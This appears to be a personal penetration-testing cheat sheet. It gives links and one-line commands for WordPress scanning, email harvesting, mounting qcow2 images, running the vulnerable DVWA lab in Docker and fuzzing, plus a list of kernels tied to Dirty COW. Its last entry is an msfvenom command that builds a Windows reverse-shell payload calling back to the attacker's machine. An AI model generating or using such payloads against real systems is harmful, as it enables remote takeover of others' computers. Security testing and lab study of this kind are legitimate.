# MOTHERS OF ALL
https://github.com/Hack-with-Github/Awesome-Hacking

# Evaluate WordPress
https://github.com/sammanthp007/WordPress-Pentesting-Setup
$ wpscan

#CRAWL
git clone https://github.com/killswitch-GUI/SimplyEmail.git
$ theharvester

# Mount qcow2 files
modprobe nbd
qemu-nbd --connect=/dev/nbd0 /path/to/qcow2file
mount /dev/nbd0p1 mnt


# DOCKER
## DVWA
https://github.com/ethicalhack3r/DVWA.git
docker run --rm -it -p 8000:80 vulnerables/web-dvwa
## Apache
httpd 
/usr/local/apache2/htdocs/index.html


# FUZZER
https://github.com/mirrorer/afl.git
https://github.com/jtpereyda/boofuzz.git # pip install boofuzz


#Dirty COW Kernels
    4.8.0-26.28 for Ubuntu 16.10
    4.4.0-45.66 for Ubuntu 16.04 LTS
    3.13.0-100.147 for Ubuntu 14.04 LTS
    3.2.0-113.155 for Ubuntu 12.04 LTS
    3.16.36-1+deb8u2 for Debian 8
    3.2.82-1 for Debian 7
    4.7.8-1 for Debian unstable


## Different address spaces in memory are organzed by memory maps; to list:
cat /proc/self/maps

## TRIDACTYL direct Download
https://tridactyl.cmcaine.co.uk/betas/tridactyl-latest.xpi

## Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
-f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
